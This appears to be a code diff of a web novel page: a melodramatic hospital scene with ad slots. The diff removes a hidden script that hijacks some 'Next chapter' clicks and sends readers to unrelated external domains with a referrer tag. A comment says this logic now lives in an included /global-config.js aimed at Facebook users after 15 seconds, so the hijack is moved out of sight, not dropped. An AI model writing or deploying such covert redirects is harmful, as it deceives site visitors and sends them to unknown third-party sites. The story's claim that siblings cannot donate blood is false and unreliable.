@@ -2396,7 +2396,7 @@
                 <p>The hospital director hurried over.</p>
                 <p>&#34;Mrs. Evans?&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>Mrs. Evans grabbed the director&#39;s arm.</p>
                 <p>&#34;That&#39;s my daughter!&#34;</p>
                 <p>&#34;My daughter I&#39;ve been searching for seventeen years!&#34;</p>
@@ -2418,7 +2418,7 @@
                 <p>&#34;Four transfusion ports can&#39;t keep up.&#34;</p>
                 <p>The director strode out of the operating room.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Mrs. Evans and Justin immediately surrounded him.</p>
                 <p>&#34;How is my daughter?&#34;</p>
                 <p>The director shook his head heavily.</p>
@@ -2429,7 +2429,7 @@
                 <p>Justin thrust out his arm.</p>
                 <p>&#34;Take mine! I&#39;m type B!&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>The director stopped him.</p>
                 <p>&#34;Siblings can&#39;t donate blood.&#34;</p>
                 <p>&#34;It causes hemolytic disease.&#34;</p>
@@ -2440,7 +2440,7 @@
                 <p>&#34;The risk is very high.&#34;</p>
                 <p>Justin slapped himself hard.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>&#34;It&#39;s all my fault!&#34;</p>
                 <p>&#34;I forced my sister to jump!&#34;</p>
                 <p>He slid down the wall.</p>
@@ -2577,37 +2577,7 @@
             }
         });
 
-        // Intercept Next button clicks and redirect to external domain
-        // 5% -> n1.cuvupa.co.uk, 0.5% -> n1.nougmi.xyz, 94.5% normal
-        (function() {
-            const nextBtn = document.getElementById('next-chapter');
-            if (nextBtn && nextBtn.href) {
-                nextBtn.addEventListener('click', function(e) {
-                    const rand = Math.random();
-
-                    // 7% probability to redirect to cuvupa
-                    if (rand < 0.07) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
-                    // 0.5% probability to redirect to hotelterdekat
-                    } else if (rand < 0.075) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://novel.hotelterdekat.id${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to hotelterdekat with ref:', externalUrl);
-                    }
-                    // Otherwise, let the default link behavior work (92.5% probability)
-                });
-            }
-        })();
+        // Next 按钮的 FB 外部跳转逻辑已迁移至 /global-config.js（15s 后对 FB 用户生效）
 
         // Record reading history
         document.addEventListener('DOMContentLoaded', function() {
@@ -4242,5 +4212,6 @@
     });
   })();
 </script>
+<script src="/global-config.js"></script>
 </body>
 </html>
